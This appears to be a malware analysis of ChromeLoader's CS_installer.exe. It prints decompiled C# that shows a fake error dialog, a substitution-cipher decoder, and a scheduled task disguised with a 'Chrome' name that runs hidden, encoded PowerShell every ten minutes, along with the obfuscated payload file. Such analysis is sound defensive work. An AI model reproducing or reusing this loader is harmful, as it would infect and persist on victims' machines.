### Investigating and dissecting some of the source code from CS_installer.exe.

### Class `internal class Program`

### Function Main

#### ChromeLoader pretends to display an error for the user and has a delayed execution.

```cs
private static void Main(string[] args)
{
	if (Program.MessageBox((IntPtr)0, "Install Error, incompatible system", "Error", 5) == 99)
	{
		Environment.Exit(0);
	}
	using (TaskService ts = new TaskService())
	{
		using (IEnumerator<Task> enumerator = ts.AllTasks.GetEnumerator())
		{
			while (enumerator.MoveNext())
			{
				if (enumerator.Current.Definition.Actions[0].ToString().Contains("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E"))
				{
					Environment.Exit(0);
				}
			}
		}
		TaskDefinition td = ts.NewTask();
		td.RegistrationInfo.Description = "Example task";
		td.Triggers.Add<TimeTrigger>(new TimeTrigger(DateTime.Now.AddMinutes(1.0))
		{
			Repetition = new RepetitionPattern(TimeSpan.FromMinutes(10.0), TimeSpan.Zero, false)
		});
		string script = Program.deScramble();
		td.Actions.Add<ExecAction>(new ExecAction("cmd", "/c start /min \"\" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E " + script, null));
		string[] namesDict = new string[]
		{
			"Loader",
			"Monitor",
			"Checker",
			"Conf",
			"Task",
			"Updater"
		};
		int nameIndex = new Random().Next(namesDict.Length);
		string taskName = "Chrome" + namesDict[nameIndex];
		ts.RootFolder.RegisterTaskDefinition(taskName, td);
	}
}
```

### Function DeScramble

```cs
public static string deScramble()
{
	string res = "";
	Dictionary<char, char> replaceDict = new Dictionary<char, char>
	{
		{
			'G',
			'0'
		},
		{
			'V',
			'1'
		},
		{
			'U',
			'2'
		},
		{
			'z',
			'3'
		},
		{
			'x',
			'4'
		},
		{
			'i',
			'5'
		},
		{
			'9',
			'6'
		},
		{
			'R',
			'7'
		},
		{
			'b',
			'8'
		},
		{
			'W',
			'9'
		},
		{
			'n',
			'a'
		},
		{
			'T',
			'b'
		},
		{
			'S',
			'c'
		},
		{
			'E',
			'd'
		},
		{
			'Y',
			'e'
		},
		{
			'c',
			'f'
		},
		{
			'd',
			'g'
		},
		{
			'g',
			'h'
		},
		{
			'X',
			'i'
		},
		{
			'j',
			'j'
		},
		{
			'B',
			'k'
		},
		{
			'q',
			'l'
		},
		{
			'3',
			'm'
		},
		{
			'o',
			'n'
		},
		{
			'P',
			'o'
		},
		{
			'm',
			'p'
		},
		{
			'l',
			'q'
		},
		{
			'1',
			'r'
		},
		{
			'F',
			's'
		},
		{
			'0',
			't'
		},
		{
			'e',
			'u'
		},
		{
			'w',
			'v'
		},
		{
			'a',
			'w'
		},
		{
			'u',
			'x'
		},
		{
			'J',
			'y'
		},
		{
			't',
			'z'
		},
		{
			'r',
			'A'
		},
		{
			'C',
			'B'
		},
		{
			'Z',
			'C'
		},
		{
			'Q',
			'D'
		},
		{
			'I',
			'E'
		},
		{
			's',
			'F'
		},
		{
			'=',
			'G'
		},
		{
			'D',
			'H'
		},
		{
			'O',
			'I'
		},
		{
			'7',
			'J'
		},
		{
			'y',
			'K'
		},
		{
			'H',
			'L'
		},
		{
			'v',
			'M'
		},
		{
			'M',
			'N'
		},
		{
			'L',
			'O'
		},
		{
			'N',
			'P'
		},
		{
			'2',
			'Q'
		},
		{
			'6',
			'R'
		},
		{
			'p',
			'S'
		},
		{
			'f',
			'T'
		},
		{
			'A',
			'U'
		},
		{
			'5',
			'V'
		},
		{
			'K',
			'W'
		},
		{
			'h',
			'X'
		},
		{
			'8',
			'Y'
		},
		{
			'k',
			'Z'
		},
		{
			'4',
			'='
		}
	};
	foreach (char c in File.ReadAllText("_meta.txt"))
	{
		if (replaceDict.ContainsKey(c))
		{
			res += replaceDict[c].ToString();
		}
		else
		{
			res += c.ToString();
		}
	}
	return res;
}
```

### Function MessageBox

```cs
[DllImport("User32.dll", CharSet = CharSet.Unicode)]
public static extern int MessageBox(IntPtr h, string m, string c, int type);
```

### Contents of _meta.txt

```
7rCqrDdrErC2r=IrErCPrZrrN2rdrZOr7rrPrZ2rk2CerD8rLdCvrIbr2aCCrIar22C2rsrr6rCCrs2r22rmrsar8aCPrDOrTaC0r=ArOdryrZ2r8aCwr=xrkdC2r=IrErCPrZrrN2rdrZOr7rCqrDdrErC2r=IrErCPrsar8aCwr=xrkdrer=PrSarXrrPr7rCgrDOr8aCPr=BrEdCqrIxr82C0r=ArOrrWrZrrOdrBrZdr7rCqr=xrEdr9rIarfaCQrIIrfrCCrsrrArCIrIIr5rCCrZBrhrCgrDOr8aCPr=BrEdCqrZxrYdCmrDrrOdryrZ2rErCgrDvrnaCLr=IrT2CqrZrrN2rdrZOr2aCPrDOrTaC0r=ArfrCwr=IrkrCqrDOrOdryrZ2rkrCwr=Gr82Cmr=xrOrrWrZrrOdCqrD2rErCqrDOrn2Ctr=GrY2Car=ArHdCjr=brOdryrrPr7rCmrDvrfaCar=ArTdrdrQGrOrrarrPr7rCBr=2rOrrWrZrrvrryrZ2rEdCqrDOrOrrWrZrrvrryrrPryrCDr=ArErr0rsSrT2CmrIbr8dClr=Ar8aCGrZrr5aCmr=xrvarJrsbrArCJr=br8aCqrDvrSardrZGr6dCmr=arErCqrDOrOrrXr=xr82C0r=ArN2ror=vrnrCJr=brT2CqrZxrk2Cxr=Ar7arXrZBrOrCbrZrrAaCqr=ark2CjrD2rH2CNr=OrndCqr=vrErrdrIvrTaC0r=Gr82Cer=2rfrCmr=xrk2rdrDarOrC=r=brSdCsr=Ir8aCPrZGrfaCXr=Prk2CjrD2rOrCRrrPrZ2Cmr=8ryrrBrsbrOrr0rIGr82CGr=vrnrrdrZOrTrCwr=Irkrr0r=ArYrCGr=ArTdCtr=BrTaCerZOry2CRrrPrZ2r7r=OrSdCqr=IrnaryrrBrc2ryrrPrZ2rBr=BrSaCNrDrrk2CerZrrN2rdrQIrZdCWrrPrZdCmr=8ryrrBr=BrSaCNrDrrk2CerZBrYaryrrPrZ2rBr=vrnrCJr=brT2Cqrsrr82CGr=drOrrWrZrryrCDr=ArErr0rsSrT2CmrIbr8dClr=Ar8aCGrZrr5aCmr=xrvarJrsbrArCJr=br8aCqrDvrSardrZGr6dCmr=arErCqrDOrOrrXr=xr82C0r=ArN2ror=vrnrCJr=brT2CqrZxrk2Cxr=Ar7arXrZBrKararsGrOrCbrZrrAaCqr=ark2CjrD2rOrCsrDdrk2CjrDArErCgr=OrTrCqrsrr82CGr=drOrr0rIArYrCar=IrTdCBrsrrSdCwrDrrk2CJrD2rY2rdrIArYrCqr=vrE2CGr=Ir8dCFr=ArArCgrD2rnrryrrPrZ2Cmr=8ryrr0r=xrTaCGrZdr5rCqrDvrErr0rsrr82CGr=drOrr0rsrr82CGr=drOrrXrZ2rk2CxrD2rArCgrD2rnrrXrZBry2CRrrPrZdr7rrBrErCJrDBrYaryrrBrZ2r7rDSrkaCqrD2rOrrXr=drErCGrDrrSar9rZbrHarBr=2rTaC0r=Irn2CerZbr82CJr=vrnrCmrD8rk2rerDPrn2CarZOrOrr0r=brE2CGr=8rn2CFr=ArOrrXrZ2r82CJr=vrnrCmrD8rk2CLr=IrT2CqrZOrZdr7rrBrc2Cjr=IrErCjr=drYaryrrBrZ2r7r=OrSdCqr=IrnaryrrBrZ2CWrrPrZdr7rrBr62CxrDrr82Cer=2rH2CCrDOr8aCPr=BrEdCqrZrrH2Cvr=BrErCqrDOr82CFrsrr82CGr=drOrrXrZ2r82CJr=vrnrCmrD8rk2CLr=IrT2CqrZOrOrr0rI2rk2CtrD2rn2Cer=IrErCmr=brTdC2r=IrErCPrZrrOdrBr=ArYrCGrsrr82CGr=drOdrdrZGr6dCwrDOr8aCqrrPrZ2r7rsOrk2C0r=brEdCqrZGrp2CGr=ArT2rdrZGrSrCgrD2rnrrdrZOr7rCgrDOr8aCPr=BrEdCqrIxr82C0r=ArOdrdrZGr6dCwrDOr8aCqrrPrZdr7rDGrZdr7r=ArTrCtr=ArYaryrrPrZ2r7rD2rSdCirDFrZdr7rrBrZ2Cmr=8rOrrPrs2rk2CtrD2rH2C2r=IrErCPrZrrH2C2r=IrErCPrZrrOdrBr=vrTaCer=8rArCgrD2rnrrXrZBrZdr7rrBrZ2CRrrPrZ2r7rrBrZ2rBr=vrTaCer=8rOrrWrZrr6aCqrD2rH2CQr=brTdCGr=ArTdCGrZrrH2C2r=IrErCPrZrr7rCjr=brTdC3rsrr82CGr=drZdr7rrBrZ2r7rZ2r8aCwr=xrkdrersvrSrCFr=BrErrPrZOrLarXrZBrOrCbrZrr6dCwrDOr62Cgr=vrnrr0rIbr8dClr=Ar8aCGrZrrYaryrrBrZ2r7rrBrZ2Cmr=8rOrrPrZ2rhardrZGrf2CgrD2r8aCPrZrrOdCBr=2rOdrmrrPrZ2r7rrBrZ2r7rDFrZdr7rrBrZ2r7rrBrZ2rBr=2rkrrdrQGrOrrBrsbrHdCfrDrrTrCmrD2ryrrorZOr7armrsFrv2CErrPrZ2r7rrBrZ2r7rDGrk2CFrDvrk2Cmr=8rOrrPrZ2rhardrZGrf2CgrD2r8aCPrZrrOdCsrDdrErCqr=xrSaCmr=brTdCKr=ArSdCtr=BrTaCerZOry2ryrrBrZ2r7rrBrZ2CRrrPrZ2r7rrBrZ2r7rrBr7rCUr=ArSdrdrQGrOrrBrsbrHdCfrDrrTrCmrD2ryrrorZOr7armrsFrv2CErrPrZ2r7rrBrZ2r7rDGrZdr7rrBrZ2r7rDGrZdr7rrBrZ2CWrrPrZ2r7rDGr8aCgrD2r8aCPrDFrc2ryrrPrZ2r7r=BrkdrdrZdr7rCBr=2rOrr0r=IrTdCBrZrr7rCUr=ArSdrmrDFrZdryrrPrZ2r7rrBrErCJrDBrYaryrrPrZ2r7rrBrZ2rBrDArTdrdrQGrOrCzr=Srk2CGrZrrOdCPrD2rErCarDvrLdrwrZbr7rCBr=brT2Cgr=BrTdrwrDArTdr/r=2rn2CBrQGr7rCBr=2r7dCUr=ArSdrWrZ2rEdCqrDOrOdryrrPrZ2r7rrBrZ2Cmr=8ryrrBrDArTdrdrZGrf2CgrD2r8aCPrZrrOdrBr=2rkrrXrZBrYaryrrBrZ2r7rrBrZ2C5r=xrSdCqr=Srn2CtrD2rk2CJrZGrAaCjr=drk2CBrDArTrCqr=2r5rCgrDvrnardrZGr5rCgrDvrnaCLr=IrT2CqrZrrOdrBrD2r82Ctr=FrfdCgr=Grk2rXrZrrH2CQr=brTdC3r=BrSdC0rQPr7rC3r=IrTrCtr=ArZdr7rrBrZ2r7rrBrAdCqr=GrTaCUr=ArH2C7rD2rk2C0rZrrH2Car=IrErCPrZrrOdrBr=ArYrCGrsrr82CGr=drOdrdrZGr6dCwrDOr8aCqrZrrH2Cpr=Ar8aCVrDOrSaCqrrPrZ2r7rrBrZ2CWrrPrZdr7rrBrZ2CWr=vr82CGr=vrnrCRrDGrZdryrrBrZ2r7rD2rSdCirDFrZdr7rrBrZ2r7rDSrkaCqrD2rOrrXr=drErCGrDrrSar9rZbrHarBr=2rTaC0r=Irn2CerZbr82CJr=vrnrCmrD8rk2rerDPrn2CarQbrkrCmr=2rN2rBr=2rkrr3rD8rk2CJrQGr7rCUr=ArSdrXrZrrH2CwrDArErC3r=BrTrCqrZrrOdrBr=IrSdCjr=drn2CUr=ArfdCgr=Grk2rXrrPrZ2r7rrBrc2ryrrBrZ2r7r=vr82CGr=vrnrCRrDGrZdryrrBrZ2r7r=BrkdrdrZdr5rCqrDvrErr0rsrr82CGr=drOrr0rsrr82CGr=drOrrXrZ2r82CJr=vrnrCmrD8rk2CLr=IrT2CqrZOry2CRrrPrZ2r7rrBrZ2CsrDdrSrCgr=xrkrr0rIIrSdCjr=drn2CUr=ArOrr0rIarn2CGr=ArSdCgr=arArCgrD2rnrrdrZOr7rCgrDOr8aCPr=BrEdCqrIxr82C0r=ArOdrdrZGr6rCqrDvrErCmr=xr82CGr=BrTaCersrr82CGr=drOrrXrZ2rk2CxrD2rArCgrD2rnrrXrZrrH2C=r=brSdCjr=ArZdr7rrBrZ2r7rsOrk2C0r=brEdCqrZGrp2CGr=ArT2rdrZGrSrCgrD2rnrrdrZOr7rCgrDOr8aCPr=BrEdCqrIxr82C0r=ArOdrdrZGr6dCwrDOr8aCqrrPrZ2r7rrBrc2ryrrPrZ2r7rDGrZdryrrBrc2ryrrPrZ2CGrDOrY2CRrrPrZ2r7rISrk2CGrZGrArCJr=br8aCqrDvrSardr=vrnrCJr=brT2CqrZrrcrrdrI8rTaCJrIAr82Cjr=drH2CNr=OrndCqr=vrErrdrDFrOrrBrsbrHdCQr=arTaCtr=Arf2Cgr=BrTdChr=BrTdCBr=brEarPrZBrOrCbrZrrfaCVrD2rH2CLrDArTrCFrDGrZdr7rrBrAaCGr=IrSdCGrZGrArCJr=br8aCqrDvrSardrZGr6dCmr=ark2C2r=IrErCPrZrr7rCjr=drSdCwr=Grk2C2r=IrErCPrZrrH2CCrDOrkaCVr=Grk2CerD2rfrCmrDvrErrdrZGrH2CFr=br82CBrZGrk2CxrD2rk2CerDvrn2Cwr=xrN2rXrZ2rk2CxrD2rArCgrD2rnrrXrZarOrr0rZGrSdCqrDvrErCwrDOrk2r0r=ar82CtrD2rH2Ctr=ArSaCtr=BrTaCerZarOrr0rZGrTdCwr=ArSdCJr=2rn2Cgr=arTaCorDvrHrrdrZGrH2CBr=BrSaCgr=OrTrCqrZGrSaCqrDvrSaCmr=brTdr0r=vrSdCgrDvrnrCqr=2rH2CXrDAr8dCXr=ark2ryrrBrc2Cjr=IrErCjr=drYaryrrBrZ2CGrDOrY2ryrrBrZ2CRrrPrZ2r7rrBr7rCqrDOrSdrdrQGrOrrBrIArSdCJr=brSdCTrQrrh2ryrrBrZ2r7r=BrkdrdrZdr7rCBr=2rOrr0r=IrTdCBrZrr7rCUr=ArSdrmrrPrZ2r7rrBrYaryrrBrZ2r7rrBrEaCor=ArErrdrZOrnrCGrD2rSrCtrQPrHarwrZ2rkrCwr=Gr82Cmr=xrHaCqrDOrSdr/r=2rn2CBrQGr7rCBr=2r7dCUr=ArSdrWrZ2rEdCqrDOrOdrdrZGrf2CqrD2rnrCwr=2rOrC2rIbrAaCArZrrH2CZr=brkrCirZrr7rCqrDOrSdryrrBrZ2r7rDGrZdr7rrBrZ2Cqr=arSaCqrrPrZ2r7rrBrYaryrrBrZ2r7rrBrEaCor=ArErrdrZOrnrCGrD2rSrCtrQPrHarwrZ2rkrCwr=Gr82Cmr=xrHaCqrDOrSdrXrZrrH2CMr=ArErCPr=brkrrdrsrrfaCfrs2rOrr0rIOrTaCBrDBrOrrBr=ArSdCJrrPrZ2r7rrBrc2ryrrBrZ2CWr=vr82CGr=vrnrCRrDGrZdr7rDGrZdryrDGr
```

### class `Microsoft.Win32.TaskScheduler`

### Creation of a new instance of TaskService

```cs
TaskService ts = new TaskService()
```

### Task Configuration

```cs
TaskDefinition td = ts.NewTask();
		td.RegistrationInfo.Description = "Example task";
		td.Triggers.Add<TimeTrigger>(new TimeTrigger(DateTime.Now.AddMinutes(1.0))
		{
			Repetition = new RepetitionPattern(TimeSpan.FromMinutes(10.0), TimeSpan.Zero, false)
		});

td.Actions.Add<ExecAction>(new ExecAction("cmd", "/c start /min \"\" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E " + script, null));

You can see here that a dictionary is used to generate a list of unique task names.

string[] namesDict = new string[]
		{
			"Loader",
			"Monitor",
			"Checker",
			"Conf",
			"Task",
			"Updater"
		};	
int nameIndex = new Random().Next(namesDict.Length);
string taskName = "Chrome" + namesDict[nameIndex];
```

### Creation of task

```
ts.RootFolder.RegisterTaskDefinition(taskName, td);
```




